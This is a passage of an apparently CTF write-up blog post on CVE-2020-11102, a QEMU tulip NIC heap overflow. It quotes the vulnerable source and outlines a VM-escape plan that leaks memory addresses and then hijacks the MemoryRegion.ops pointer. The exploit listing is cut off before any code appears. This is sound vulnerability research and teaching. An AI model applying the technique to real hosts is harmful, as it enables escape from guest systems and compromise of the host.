<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="CVE-2020-11102: Escape from the Earth Introduction I participated in the Aliyun CTF competition recently and solved an interesting challenge based on CVE-2020-11102, which is a vulnerability in qemu t">
<meta property="og:type" content="article">
<meta property="og:title" content="CVE-2020-11102: Escape from the Earth">
<meta property="og:url" content="https://kpwnz.github.io/2023/04/25/CVE-2020-11102-Escape-from-the-Earth/index.html">
<meta property="og:site_name">
<meta property="og:description" content="CVE-2020-11102: Escape from the Earth Introduction I participated in the Aliyun CTF competition recently and solved an interesting challenge based on CVE-2020-11102, which is a vulnerability in qemu t">
<meta property="og:locale" content="en_US">
<meta property="article:published_time" content="2023-04-25T07:50:54.000Z">
<meta property="article:modified_time" content="2023-04-25T05:11:07.113Z">
<meta property="article:author" content="Xia0o0o0o">
<meta property="article:tag" content="Vulnerability">
<meta property="article:tag" content="PWN">
<meta property="article:tag" content="Writeup">
<meta property="article:tag" content="QEMU">
<meta property="article:tag" content="VM Escape">
<meta property="article:tag" content="CTF">
<meta name="twitter:card" content="summary">
    
    
      
        
          <link rel="shortcut icon" href="../../../../https:/avatars.githubusercontent.com/u/22996989?s=400&amp;u=18dec832f23e8e1d9f7097245cd5b955990979b8&amp;v=4">
        
      
      
        
          <link rel="icon" type="image/png" href="../../../../https:/avatars.githubusercontent.com/u/22996989?s=400&amp;u=18dec832f23e8e1d9f7097245cd5b955990979b8&amp;v=4" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="../../../../https:/avatars.githubusercontent.com/u/22996989?s=400&amp;u=18dec832f23e8e1d9f7097245cd5b955990979b8&amp;v=4">
        
      
    
    <!-- title -->
    <title>CVE-2020-11102: Escape from the Earth</title>
    <!-- async scripts -->
    <!-- Google Analytics -->


    <!-- Umami Analytics -->


    <!-- styles -->
    
<link rel="stylesheet" href="../../../../css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	
		<script type="text/x-mathjax-config">
		  MathJax.Hub.Config({
			tex2jax: {
			  skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
			  inlineMath: [['$','$']]
			}
		  });
		</script>
		<script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-MML-AM_CHTML' async></script>
	
<meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="atom.xml" title="" type="application/atom+xml">
</head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
      <!--
           -->
        <li>
          <span style="display: flex; align-items: center;">
            <title>
              Home
            </title>
            <svg data-testid="geist-icon" height="16" stroke-linejoin="round" viewBox="0 0 16 16" width="16" style="color: currentcolor;"><path fill-rule="evenodd" clip-rule="evenodd" d="M12.5 6.56062L8.00001 2.06062L3.50001 6.56062V13.5L6.00001 13.5V11C6.00001 9.89539 6.89544 8.99996 8.00001 8.99996C9.10458 8.99996 10 9.89539 10 11V13.5L12.5 13.5V6.56062ZM13.78 5.71933L8.70711 0.646409C8.31659 0.255886 7.68342 0.255883 7.2929 0.646409L2.21987 5.71944C2.21974 5.71957 2.21961 5.7197 2.21949 5.71982L0.469676 7.46963L-0.0606537 7.99996L1.00001 9.06062L1.53034 8.53029L2.00001 8.06062V14.25V15H2.75001L6.00001 15H7.50001H8.50001H10L13.25 15H14V14.25V8.06062L14.4697 8.53029L15 9.06062L16.0607 7.99996L15.5303 7.46963L13.7806 5.71993C13.7804 5.71973 13.7802 5.71953 13.78 5.71933ZM8.50001 11V13.5H7.50001V11C7.50001 10.7238 7.72386 10.5 8.00001 10.5C8.27615 10.5 8.50001 10.7238 8.50001 11Z" fill="currentColor"></path></svg>
              <a style="padding-left: 9px;" href="../../../../index.html">
                Home
              </a>
          </span>
        </li>
        <!--
           -->
        <li>
          <span style="display: flex; align-items: center;">
            <title>
              Writing
            </title>
            <svg data-testid="geist-icon" height="16" stroke-linejoin="round" viewBox="0 0 16 16" width="16" style="color: currentcolor;"><path clip-rule="evenodd" d="M4.25 0C3.00736 0 2 1.00736 2 2.25V11V11.25V11.5C2 12.5252 2.61705 13.4062 3.5 13.792V11.5V11.25V11C3.5 10.4477 3.94772 10 4.5 10H12.5V11.2305V12.5H10.5V14H12.5H14V12.5V11.2305V10V8.5V0.75V0H13.25H4.25ZM12.5 8.5V1.5H4.25C3.83579 1.5 3.5 1.83579 3.5 2.25V8.70802C3.80623 8.57422 4.14445 8.5 4.5 8.5H12.5ZM5.5 11.5C5.22386 11.5 5 11.7239 5 12V16L7 14.75L9 16V12C9 11.7239 8.77614 11.5 8.5 11.5H5.5Z" fill="currentColor" fill-rule="evenodd"></path></svg>
              <a style="padding-left: 9px;" href="../../../../archives/">
                Writing
              </a>
          </span>
        </li>
        <!--
           -->
        <li>
          <span style="display: flex; align-items: center;">
            <title>
              Projects
            </title>
            <svg data-testid="geist-icon" height="16" stroke-linejoin="round" viewBox="0 0 16 16" width="16" style="color: currentcolor;"><path fill-rule="evenodd" clip-rule="evenodd" d="M1.80808 4.44191L2.25003 4.88386L3.13391 3.99997L2.69196 3.55803L1.63391 2.49997L2.69197 1.44191L3.13391 0.999972L2.25003 0.116089L1.80808 0.558031L0.484858 1.88126C0.143149 2.22296 0.143149 2.77698 0.484859 3.11869L1.80808 4.44191ZM12 0.999972H11.25V2.49997H12H13.5V11.75C13.5 12.7165 12.7165 13.5 11.75 13.5H4.25002C3.28353 13.5 2.50003 12.7165 2.50003 11.75V6.99997V6.24997H1.00003V6.99997V11.75C1.00003 13.5449 2.4551 15 4.25002 15H11.75C13.545 15 15 13.5449 15 11.75V1.74997V0.999972H14.25H12ZM7.75003 4.88386L8.19197 4.44191L9.51519 3.11869C9.8569 2.77698 9.8569 2.22296 9.51519 1.88126L8.19196 0.55803L7.75002 0.116089L6.86614 0.999973L7.30808 1.44191L8.36614 2.49997L7.30809 3.55803L6.86615 3.99997L7.75003 4.88386ZM4.13155 3.89688L4.02847 4.51535L5.26541 4.7215L5.36848 4.10303L5.86848 1.10303L5.97156 0.484566L4.73462 0.278409L4.63155 0.896878L4.13155 3.89688Z" fill="currentColor"></path></svg>
              <a style="padding-left: 9px;" href="../../../../https:/github.com/KpwnZ">
                Projects
              </a>
          </span>
        </li>
        
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" aria-label="Previous post" href="../../../05/08/SDCTF-2023-Writeup/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" aria-label="Next post" href="../../../../2022/12/22/CVE-2022-46702-Remember-to-Clean-Up-the-Memory/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://kpwnz.github.io/2023/04/25/CVE-2020-11102-Escape-from-the-Earth/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://kpwnz.github.io/2023/04/25/CVE-2020-11102-Escape-from-the-Earth/&text=CVE-2020-11102: Escape from the Earth"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://kpwnz.github.io/2023/04/25/CVE-2020-11102-Escape-from-the-Earth/&title=CVE-2020-11102: Escape from the Earth"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://kpwnz.github.io/2023/04/25/CVE-2020-11102-Escape-from-the-Earth/&is_video=false&description=CVE-2020-11102: Escape from the Earth"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=CVE-2020-11102: Escape from the Earth&body=Check out this article: https://kpwnz.github.io/2023/04/25/CVE-2020-11102-Escape-from-the-Earth/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://kpwnz.github.io/2023/04/25/CVE-2020-11102-Escape-from-the-Earth/&title=CVE-2020-11102: Escape from the Earth"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://kpwnz.github.io/2023/04/25/CVE-2020-11102-Escape-from-the-Earth/&title=CVE-2020-11102: Escape from the Earth"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://kpwnz.github.io/2023/04/25/CVE-2020-11102-Escape-from-the-Earth/&title=CVE-2020-11102: Escape from the Earth"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://kpwnz.github.io/2023/04/25/CVE-2020-11102-Escape-from-the-Earth/&title=CVE-2020-11102: Escape from the Earth"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://kpwnz.github.io/2023/04/25/CVE-2020-11102-Escape-from-the-Earth/&name=CVE-2020-11102: Escape from the Earth&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://kpwnz.github.io/2023/04/25/CVE-2020-11102-Escape-from-the-Earth/&t=CVE-2020-11102: Escape from the Earth"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    
    
      <div id="toc">
        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">1.</span> <span class="toc-text">CVE-2020-11102: Escape from the Earth</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Introduction"><span class="toc-number">1.1.</span> <span class="toc-text">Introduction</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#The-vulnerability"><span class="toc-number">1.2.</span> <span class="toc-text">The vulnerability</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exploitation"><span class="toc-number">1.3.</span> <span class="toc-text">Exploitation</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Leak-something-first"><span class="toc-number">1.3.1.</span> <span class="toc-text">Leak something first</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Exploitation-2"><span class="toc-number">1.3.2.</span> <span class="toc-text">Exploitation</span></a></li></ol></li></ol></li></ol>
      </div>
    
  </span>
</div>

    
    <div class="content index py4 ">
        
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle p-name" itemprop="name headline">
        CVE-2020-11102: Escape from the Earth
    </h1>



    <div class="meta">
      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span class="p-name" itemprop="name">Xia0o0o0o</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2023-04-25T07:50:54.000Z" class="dt-published" itemprop="datePublished">2023-04-25</time>
        
      
    </div>


      

      
    <div class="article-tag" style="text-decoration: none;">
        <i class="fa-solid fa-tag"></i>
        <a class="tag-category" href="../../../../tags/CTF/" rel="tag">CTF</a> <a class="tag-category" href="../../../../tags/PWN/" rel="tag">PWN</a> <a class="tag-category" href="../../../../tags/QEMU/" rel="tag">QEMU</a> <a class="tag-category" href="../../../../tags/VM-Escape/" rel="tag">VM Escape</a> <a class="tag-category" href="../../../../tags/Vulnerability/" rel="tag">Vulnerability</a> <a class="tag-category" href="../../../../tags/Writeup/" rel="tag">Writeup</a>
    </div>


    </div>
  </header>
  

  <div class="content e-content" itemprop="articleBody">
    <h1>CVE-2020-11102: Escape from the Earth</h1>
<h2 id="Introduction">Introduction</h2>
<p>I participated in the Aliyun CTF competition recently and solved an interesting challenge based on CVE-2020-11102, which is a vulnerability in qemu that allows guest OS to escape and execute arbitrary code on the host OS. In this article, I would like to share some detail about the challenge and what I learned from it.</p>
<h2 id="The-vulnerability">The vulnerability</h2>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">tulip_copy_tx_buffers</span><span class="params">(TULIPState *s, struct tulip_descriptor *desc)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> len1 = (desc-&gt;control &gt;&gt; TDES1_BUF1_SIZE_SHIFT) &amp; TDES1_BUF1_SIZE_MASK;</span><br><span class="line">    <span class="keyword">int</span> len2 = (desc-&gt;control &gt;&gt; TDES1_BUF2_SIZE_SHIFT) &amp; TDES1_BUF2_SIZE_MASK;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (len1) &#123;</span><br><span class="line">        pci_dma_read(&amp;s-&gt;dev, desc-&gt;buf_addr1,</span><br><span class="line">            s-&gt;tx_frame + s-&gt;tx_frame_len, len1);</span><br><span class="line">        s-&gt;tx_frame_len += len1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (len2) &#123;</span><br><span class="line">        pci_dma_read(&amp;s-&gt;dev, desc-&gt;buf_addr2,</span><br><span class="line">            s-&gt;tx_frame + s-&gt;tx_frame_len, len2);</span><br><span class="line">        s-&gt;tx_frame_len += len2;</span><br><span class="line">    &#125;</span><br><span class="line">    desc-&gt;status = (len1 + len2) ? <span class="number">0</span> : <span class="number">0x7fffffff</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Take a look at <code>tulip_copy_tx_buffers()</code> first. It copies the <code>desc-&gt;buf_addr1</code> to the <code>tx_frame + s-&gt;tx_frame_len</code>. Notice that there is no check for the <code>s-&gt;tx_frame_len</code> as well as the <code>len1</code>. And <code>s-&gt;tx_frame_len</code> will be increased by <code>len1</code> after copying. When we call this function multiple times, the <code>s-&gt;tx_frame_len</code> can be increased to a very large value, which can cause a buffer overflow.</p>
<p>The same applies to <code>tulip_copy_rx_bytes()</code>.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">tulip_copy_rx_bytes</span><span class="params">(TULIPState *s, struct tulip_descriptor *desc)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> len1 = (desc-&gt;control &gt;&gt; RDES1_BUF1_SIZE_SHIFT) &amp; RDES1_BUF1_SIZE_MASK;</span><br><span class="line">    <span class="keyword">int</span> len2 = (desc-&gt;control &gt;&gt; RDES1_BUF2_SIZE_SHIFT) &amp; RDES1_BUF2_SIZE_MASK;</span><br><span class="line">    <span class="keyword">int</span> len;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (s-&gt;rx_frame_len &amp;&amp; len1) &#123;</span><br><span class="line">        <span class="keyword">if</span> (s-&gt;rx_frame_len &gt; len1) &#123;</span><br><span class="line">            len = len1;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            len = s-&gt;rx_frame_len;</span><br><span class="line">        &#125;</span><br><span class="line">        pci_dma_write(&amp;s-&gt;dev, desc-&gt;buf_addr1, s-&gt;rx_frame +</span><br><span class="line">            (s-&gt;rx_frame_size - s-&gt;rx_frame_len), len);</span><br><span class="line">        s-&gt;rx_frame_len -= len;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (s-&gt;rx_frame_len &amp;&amp; len2) &#123;</span><br><span class="line">        <span class="keyword">if</span> (s-&gt;rx_frame_len &gt; len2) &#123;</span><br><span class="line">            len = len2;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            len = s-&gt;rx_frame_len;</span><br><span class="line">        &#125;</span><br><span class="line">        pci_dma_write(&amp;s-&gt;dev, desc-&gt;buf_addr2, s-&gt;rx_frame +</span><br><span class="line">            (s-&gt;rx_frame_size - s-&gt;rx_frame_len), len);</span><br><span class="line">        s-&gt;rx_frame_len -= len;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>The <code>tulip_copy_rx_bytes()</code> function copies the <code>s-&gt;rx_frame</code> to the <code>desc-&gt;buf_addr1</code>. And there is no check for the <code>s-&gt;rx_frame_len</code> and <code>s-&gt;rx_frame_size</code>. This results in possible memory disclosure.</p>
<h2 id="Exploitation">Exploitation</h2>
<h3 id="Leak-something-first">Leak something first</h3>
<p>To leak QEMU base address and heap address we need to control <code>s-&gt;rx_frame_size</code> and <code>s-&gt;rx_frame_len</code>. Consider the following code:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">TULIPState</span> &#123;</span></span><br><span class="line">    PCIDevice dev;</span><br><span class="line">    MemoryRegion io;</span><br><span class="line">    MemoryRegion memory;</span><br><span class="line">    NICConf c;</span><br><span class="line">    qemu_irq irq;</span><br><span class="line">    NICState *nic;</span><br><span class="line">    <span class="keyword">eeprom_t</span> *eeprom;</span><br><span class="line">    <span class="keyword">uint32_t</span> csr[<span class="number">16</span>];</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* state for MII */</span></span><br><span class="line">    <span class="keyword">uint32_t</span> old_csr9;</span><br><span class="line">    <span class="keyword">uint32_t</span> mii_word;</span><br><span class="line">    <span class="keyword">uint32_t</span> mii_bitcnt;</span><br><span class="line"></span><br><span class="line">    hwaddr current_rx_desc;</span><br><span class="line">    hwaddr current_tx_desc;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint8_t</span> rx_frame[<span class="number">2048</span>];</span><br><span class="line">    <span class="keyword">uint8_t</span> tx_frame[<span class="number">2048</span>];</span><br><span class="line">    <span class="keyword">int</span> tx_frame_len;</span><br><span class="line">    <span class="keyword">int</span> rx_frame_len;</span><br><span class="line">    <span class="keyword">int</span> rx_frame_size;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint32_t</span> rx_status;</span><br><span class="line">    <span class="keyword">uint8_t</span> filter[<span class="number">16</span>][<span class="number">6</span>];</span><br><span class="line">&#125; TULIPState;</span><br></pre></td></tr></table></figure>
<p>The <code>tx_frame</code> is a fixed size buffer, which is 2048 bytes. By triggering <code>tulip_copy_tx_buffers()</code> multiple times, we can control <code>tx_frame_len</code>, <code>rx_frame_len</code> and <code>rx_frame_size</code>. Then we can call <code>tulip_copy_rx_bytes()</code> and copy the heap memory back to the user space of the guest OS. With some calculation, we can retrieve the QEMU base address and heap address very easily.</p>
<p>After leaking the memory, we need to figure out how to get arbitrary code exection within the context of QEMU. This piece of code caught my attention:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> MemoryRegionOps tulip_ops = &#123;</span><br><span class="line">    .read = tulip_read,</span><br><span class="line">    .write = tulip_write,</span><br><span class="line">    .endianness = DEVICE_LITTLE_ENDIAN,</span><br><span class="line">    .impl = &#123;</span><br><span class="line">        .min_access_size = <span class="number">4</span>,</span><br><span class="line">        .max_access_size = <span class="number">4</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>What if we can control the function pointer in <code>tulip_ops</code>? Unfortunately, the <code>tulip_ops</code> is  not writable.</p>
<p>When initializing the memory region of <code>TULIPState</code>, the pointer to <code>tulip_ops</code> will be assigned to <code>struct MemoryRegion.ops</code>.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">    memory_region_init_io(&amp;s-&gt;io, OBJECT(&amp;s-&gt;dev), &amp;tulip_ops, s,</span><br><span class="line">            <span class="string">&quot;tulip-io&quot;</span>, <span class="number">128</span>);</span><br><span class="line"></span><br><span class="line">    memory_region_init_io(&amp;s-&gt;memory, OBJECT(&amp;s-&gt;dev), &amp;tulip_ops, s,</span><br><span class="line">            <span class="string">&quot;tulip-mem&quot;</span>, <span class="number">128</span>);</span><br><span class="line">            </span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">MemoryRegion</span> &#123;</span></span><br><span class="line">    Object parent_obj;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* All fields are private - violators will be prosecuted */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* The following fields should fit in a cache line */</span></span><br><span class="line">    <span class="keyword">bool</span> romd_mode;</span><br><span class="line">    <span class="keyword">bool</span> ram;</span><br><span class="line">    <span class="keyword">bool</span> subpage;</span><br><span class="line">    <span class="keyword">bool</span> readonly; <span class="comment">/* For RAM regions */</span></span><br><span class="line">    <span class="keyword">bool</span> nonvolatile;</span><br><span class="line">    <span class="keyword">bool</span> rom_device;</span><br><span class="line">    <span class="keyword">bool</span> flush_coalesced_mmio;</span><br><span class="line">    <span class="keyword">bool</span> global_locking;</span><br><span class="line">    <span class="keyword">uint8_t</span> dirty_log_mask;</span><br><span class="line">    <span class="keyword">bool</span> is_iommu;</span><br><span class="line">    RAMBlock *ram_block;</span><br><span class="line">    Object *owner;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> MemoryRegionOps *ops;</span><br><span class="line">    <span class="keyword">void</span> *opaque;</span><br><span class="line">    MemoryRegion *container;</span><br><span class="line">    Int128 size;</span><br><span class="line">    hwaddr addr;</span><br><span class="line">    <span class="keyword">void</span> (*destructor)(MemoryRegion *mr);</span><br><span class="line">    <span class="keyword">uint64_t</span> align;</span><br><span class="line">    <span class="keyword">bool</span> terminates;</span><br><span class="line">    <span class="keyword">bool</span> ram_device;</span><br><span class="line">    <span class="keyword">bool</span> enabled;</span><br><span class="line">    <span class="keyword">bool</span> warning_printed; <span class="comment">/* For reservations */</span></span><br><span class="line">    <span class="keyword">uint8_t</span> vga_logging_count;</span><br><span class="line">    MemoryRegion *alias;</span><br><span class="line">    hwaddr alias_offset;</span><br><span class="line">    <span class="keyword">int32_t</span> priority;</span><br><span class="line">    QTAILQ_HEAD(, MemoryRegion) subregions;</span><br><span class="line">    QTAILQ_ENTRY(MemoryRegion) subregions_link;</span><br><span class="line">    QTAILQ_HEAD(, CoalescedMemoryRange) coalesced;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span> *name;</span><br><span class="line">    <span class="keyword">unsigned</span> ioeventfd_nb;</span><br><span class="line">    MemoryRegionIoeventfd *ioeventfds;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>And <code>struct MemoryRegion</code> is allocated on the heap. So we can overwrite the <code>struct MemoryRegion.ops</code> with the address of <code>tx_frame</code> and craft a fake <code>struct MemoryRegionOps</code>.<br>
Also, notice that the type of <code>tx_frame_len</code>, <code>rx_frame_len</code> and <code>rx_frame_size</code> are all <code>int</code>, which means we can write backward if we overwrite these fields with negative value.</p>
<h3 id="Exploitation-2">Exploitation</h3>
<p>The exploitation should be pretty straightforward and the comments in the code should be self-explanatory.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span 